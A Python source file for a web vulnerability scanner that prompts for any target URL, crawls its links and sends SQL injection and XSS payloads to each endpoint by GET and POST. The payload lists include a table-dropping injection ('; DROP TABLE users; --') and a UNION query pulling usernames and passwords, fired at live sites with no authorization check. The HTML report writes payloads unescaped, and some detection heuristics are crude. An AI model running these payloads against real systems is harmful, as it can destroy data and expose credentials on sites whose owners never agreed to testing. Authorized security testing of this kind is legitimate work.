import requests
import time
import logging
from urllib.parse import urljoin
from bs4 import BeautifulSoup


class AdvancedVulnerabilityScanner:
    def __init__(self, url, endpoints):
        self.url = url.rstrip('/')  # Remove trailing slash for consistency
        self.endpoints = endpoints  # List of endpoints to scan
        self.vulnerabilities = []  # List to store vulnerabilities

    def scan(self):
        print(f"Scanning {self.url} for vulnerabilities...")

        # Scan the base URL first
        self.check_sql_injection(self.url)
        self.check_xss(self.url)

        # Then scan each specified endpoint
        for endpoint in self.endpoints:
            full_url = urljoin(self.url, endpoint)
            self.check_sql_injection(full_url)
            self.check_xss(full_url)

    def check_sql_injection(self, full_url):
        print(f"Checking for SQL Injection vulnerabilities at {full_url}...")

        # Expanded list of SQL injection payloads
        payloads = [
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT null, username, password FROM users --",
            "'; DROP TABLE users; --",
            "' AND 1=0 UNION SELECT 1, current_user() --",
            "' AND EXISTS(SELECT * FROM users) --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users' --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; WAITFOR DELAY '0:0:5' --",
        ]

        # Send a baseline request without payload
        baseline_start = time.time()
        baseline_response = requests.get(full_url + "?q=test")
        baseline_time = time.time() - baseline_start

        for payload in payloads:
            start_time = time.time()
            response = requests.get(f"{full_url}?q={payload}")
            elapsed_time = time.time() - start_time

            # Initial check for basic SQL Injection using error keywords
            if "error" in response.text.lower() or "sql" in response.text.lower():
                self.vulnerabilities.append(
                    f"Basic SQL Injection Vulnerability Found at {full_url} with payload: {payload}")
                continue  # Skip further checks if basic error found

            # Check for HTTP status codes
            if response.status_code == 500:
                self.vulnerabilities.append(
                    f"Potential SQL Injection Vulnerability Found (Server Error) at {full_url} with payload: {payload}")
                continue

            # Check for specific error messages in the response body
            if "syntax error" in response.text.lower() or "database" in response.text.lower():
                self.vulnerabilities.append(
                    f"Potential SQL Injection Vulnerability Found (Syntax Error) at {full_url} with payload: {payload}")
                continue

            # Check for significant differences in content length
            if len(response.content) != len(baseline_response.content):
                self.vulnerabilities.append(
                    f"Potential SQL Injection Vulnerability Found (Content Change) at {full_url} with payload: {payload}")
                continue

            # Check for slow response times
            if elapsed_time > baseline_time * 2:  # Adjust the multiplier as needed
                self.vulnerabilities.append(
                    f"Potential SQL Injection Vulnerability Found (Slow Response Time) at {full_url} with payload: {payload}")

            # Log response details
            logging.info(
                f"Checked payload: {payload}, Response time: {elapsed_time:.2f}s, Status code: {response.status_code}")

    def check_xss(self, full_url):
        print(f"Checking for XSS vulnerabilities at {full_url}...")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "';alert(1);//",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<a href='javascript:alert(1)'>Click me</a>",
        ]

        for payload in payloads:
            response = requests.get(f"{full_url}?q={payload}")
            if payload in response.text:
                self.vulnerabilities.append(f"Reflected XSS Vulnerability Found at {full_url} with payload: {payload}")
                continue

            # Check for stored XSS by submitting the payload via POST (if applicable)
            post_response = requests.post(full_url, data={'input': payload})
            if payload in post_response.text:
                self.vulnerabilities.append(f"Stored XSS Vulnerability Found at {full_url} with payload: {payload}")

    def crawl_for_endpoints(self):
        print(f"Crawling {self.url} for additional endpoints...")
        try:
            response = requests.get(self.url)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = {a['href'] for a in soup.find_all('a', href=True)}
            # Filter to only keep URLs that are relative or belong to the same domain
            self.endpoints.update([urljoin(self.url, link) for link in links if link.startswith('/')])
            print(f"Found endpoints: {self.endpoints}")
        except Exception as e:
            print(f"Error while crawling: {e}")

    def generate_html_report(self):
        with open("vulnerability_report.html", "w") as f:
            f.write("<html><head><title>Vulnerability Report</title>")
            f.write("<style>")
            f.write("table { width: 100%; border-collapse: collapse; }")
            f.write("th, td { border: 1px solid #dddddd; text-align: left; padding: 8px; }")
            f.write("th { background-color: #f2f2f2; }")
            f.write("h1, h2 { color: #333; }")
            f.write("</style></head><body>")
            f.write("<h1>Vulnerability Report</h1>")

            if self.vulnerabilities:
                f.write("<h2>Vulnerabilities Found:</h2>")
                f.write("<table>")
                f.write("<tr><th>Type</th><th>Endpoint</th><th>Payload</th></tr>")

                for vuln in self.vulnerabilities:
                    # Extract type, endpoint, and payload from the vulnerability string
                    parts = vuln.split(" at ")
                    vuln_type = parts[0]  # e.g., Basic SQL Injection Vulnerability Found
                    endpoint_payload = parts[1].split(" with payload: ")
                    endpoint = endpoint_payload[0]  # e.g., http://example.com/search
                    payload = endpoint_payload[1] if len(endpoint_payload) > 1 else ""  # Payload if exists

                    f.write(f"<tr><td>{vuln_type}</td><td>{endpoint}</td><td>{payload}</td></tr>")
                f.write("</table>")
            else:
                f.write("<h2>No vulnerabilities found.</h2>")

            f.write("</body></html>")
        print("HTML report generated: vulnerability_report.html")

    def report(self):
        if self.vulnerabilities:
            print("Vulnerabilities found:")
            for vuln in self.vulnerabilities:
                print(f"- {vuln}")
        else:
            print("No vulnerabilities found.")
        self.generate_html_report()  # Generate HTML report after scanning


if __name__ == "__main__":
    target_url = input("Enter the base URL of the website to scan: ")
    # Initialize with a list of common endpoints
    initial_endpoints = ['/search', '/submit']  # You can add more common endpoints
    scanner = AdvancedVulnerabilityScanner(target_url, set(initial_endpoints))

    # Optionally, crawl the base URL for additional endpoints
    scanner.crawl_for_endpoints()

    # Scan the base URL and specified endpoints for vulnerabilities
    scanner.scan()
    scanner.report()







